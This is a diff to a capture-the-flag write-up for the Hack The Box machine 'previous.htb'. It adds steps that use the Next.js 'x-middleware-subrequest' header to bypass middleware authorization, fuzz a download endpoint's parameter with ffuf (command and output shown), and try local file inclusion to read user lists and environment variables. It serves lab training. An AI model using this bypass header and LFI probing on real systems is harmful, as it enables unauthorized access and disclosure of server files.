@@ -96,6 +96,12 @@ It will bring to this page. Click around.
 
 <img width="1910" height="764" alt="image" src="https://github.com/user-attachments/assets/09d68135-1ca4-4a22-89e4-9a672c012003" />
 
+auto-add the header in the proxy settings
+
+<img width="1491" height="592" alt="image" src="https://github.com/user-attachments/assets/c0a5d8d4-efab-4b76-8143-68d95dc14dd3" />
+<img width="1278" height="290" alt="image" src="https://github.com/user-attachments/assets/28fd5438-33d7-4ae3-9420-98787421420a" />
+
+
 Inside the docs we don’t see anything. Try to to find hidden directory listings. 
 
 `gobuster dir -u http://previous.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster.txt`
@@ -146,16 +152,49 @@ Go back to burp in repeater and see if the endpoint is reachable.
 
 <img width="673" height="230" alt="image" src="https://github.com/user-attachments/assets/47375f05-c23b-4282-aed5-c2d430bf7954" />
 
-Invalid Filename. It means filename is not in our parameter, we need to fuzz it.
+Another scan for the downloads
+`$ sudo ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/wordlists/dirb/common.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2` 
+```
 
-`
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
+       v2.1.0-dev
+________________________________________________
 
+ :: Method           : GET
+ :: URL              : http://previous.htb/api/download?FUZZ=a
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 2
+________________________________________________
 
+Documents and Settings  [Status: 400, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
+example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 236ms]  <-------------
+Program Files           [Status: 400, Size: 0, Words: 1, Lines: 1, Duration: 93ms]
+reports list            [Status: 400, Size: 0, Words: 1, Lines: 1, Duration: 194ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+```
 
+Burp Suite put the parameters and try LFI
 
+<img width="1257" height="227" alt="image" src="https://github.com/user-attachments/assets/851b49fc-7ddb-4977-9b1d-7d1009a1a1ab" />
+<img width="476" height="467" alt="image" src="https://github.com/user-attachments/assets/8417c9ae-81ee-4421-a6c3-a920f506198f" />
 
+Two users, node and nextjs, were found. Checking the environment variables, the startup path was found to be /app
 
+<img width="1578" height="390" alt="image" src="https://github.com/user-attachments/assets/4302c810-fa73-4d18-912d-2bcbcab493f9" />
+
+Search and take a look at the Next.js directory example
 
 
 
